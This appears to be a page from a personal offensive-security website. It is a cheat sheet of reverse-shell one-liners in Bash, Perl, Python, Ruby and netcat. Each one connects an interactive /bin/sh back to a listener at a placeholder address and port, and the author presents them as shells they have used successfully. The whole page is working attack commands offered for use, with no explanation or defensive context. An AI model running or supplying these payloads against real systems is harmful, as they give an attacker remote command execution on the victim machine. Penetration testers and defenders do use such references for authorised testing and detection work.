---
permalink: /offensive/rev_shell/
title: "Reverse Shell"
layout: single
excerpt: " "
author_profile: true
toc: true
toc_label: "Reverse Shell TOC"
toc_icon: "laptop"
---

## Overview
This section will be a list of commonly used reverse shells that I have had success using.

## Bash
```
bash -i >& /dev/tcp/127.0.0.1/1337 0>&1
```

## Perl
```
perl -e 'use Socket;$i="127.0.0.1";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Ruby
```
ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",1337).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## Netcat
```
nc -e /bin/sh 127.0.0.1 1337
```